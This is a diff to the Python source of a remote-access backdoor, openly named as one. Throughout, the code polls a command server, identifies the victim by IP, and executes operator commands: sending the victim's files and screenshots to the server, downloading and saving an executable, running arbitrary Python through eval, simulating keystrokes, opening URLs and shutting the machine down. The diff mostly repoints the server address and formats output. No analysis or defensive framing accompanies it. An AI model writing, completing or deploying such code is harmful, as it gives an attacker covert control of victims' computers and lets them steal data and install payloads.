@@ -2,7 +2,7 @@ import requests,time,os,keyboard,pyautogui,webbrowser
 
 class backdoor:
     def __init__(self):
-        self.url = "https://pybackdoor.pythonanywhere.com/"
+        self.url = "http://127.0.0.1:8000/"
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
         while True:
@@ -46,6 +46,7 @@ class backdoor:
                         continue
                     
                     keyboard.write(commands_to_execute[i+line])
+                output += "\n"
             elif command.startswith("cd"):
                 directory_to_change = command.split(" ")
                 if len(directory_to_change) > 1:
@@ -55,6 +56,7 @@ class backdoor:
                 delay_command = command.split("(")
                 time_to_delay = delay_command[1].replace(")", "")
                 time.sleep(float(time_to_delay))
+                output += "\n"
             elif command.startswith("download"):
                 download_command = command.split("(")
                 file_to_download = download_command[1].replace(")", "")
@@ -63,23 +65,26 @@ class backdoor:
                 try:
                     file = open(file_to_download, "rb")
                     upload_file = {"file": file}
-                    r = requests.post(f"{self.website}/files/", files = upload_file)
-                    output += "Downloaded " + str(upload_file)
+                    r = requests.post(f"{self.url}/api/files/", files = upload_file)
+                    output += "Downloaded " + str(upload_file)  + "\n"
                 except FileNotFoundError:
-                    output += file_to_download + " does not exist"
+                    output += file_to_download + " does not exist \n"
+
             elif command.startswith("screenshot"):
+                print("screenshot")
                 myScreenshot = pyautogui.screenshot()
                 myScreenshot.save('screenshot.png')
                 sample_file = open("screenshot.png", "rb")
                 upload_file = {"file": sample_file}
-                r = requests.post(f"{self.website}/files/", files = upload_file)
+                r = requests.post(f"{self.url}api/files/", files = upload_file)
+                output += f"{self.url}media/files/screenshot.png"
             elif command.startswith("ls"):
                 output = ""
                 for i in os.listdir():
                     output += i + "\n"
             elif command.startswith("update"):
                 name = command.split(" ")[1]
-                get_response = requests.get(f"{self.website}/media/files/main.exe")
+                get_response = requests.get(f"{self.url}media/files/main.exe")
                 with open(name, "wb") as out_file:
                     out_file.write(get_response.content)
                 x = -2
@@ -111,9 +116,9 @@ class backdoor:
                     continue
                 elif power_command_argument.lower() == "sleep":
                     os.system("shutdown /l")
-                    output += "Computer is going on sleep"
+                    output += "Computer is going on sleep\n"
                     continue
-                output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)"
+                output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)\n"
             elif command.startswith("python"):
                 python_code = ""
                 for i in range(1, len(commands_to_execute)):
@@ -123,7 +128,7 @@ class backdoor:
                     
                     python_code += commands_to_execute[i+line] + "\n"
                 
-                output += eval(python_code)
+                output += eval(python_code) + "\n"
             elif command.startswith("web"):
                 browser_command = command.split("(")[1]
                 if len(browser_command) > 0:
@@ -131,6 +136,7 @@ class backdoor:
                     browser_command = browser_command.replace(")", "")
                     browser_command = browser_command.replace('"', '')
                     webbrowser.open_new(browser_command)
+                    output += "opening " + browser_command + "\n"
                 else:
                     output += "No argument provided\n"
             elif command.startswith("mouse"):
@@ -200,8 +206,4 @@ class backdoor:
 
         return output
 
-while True:
-    try:
-        backdoor()   
-    except: 
-        continue
+backdoor()   
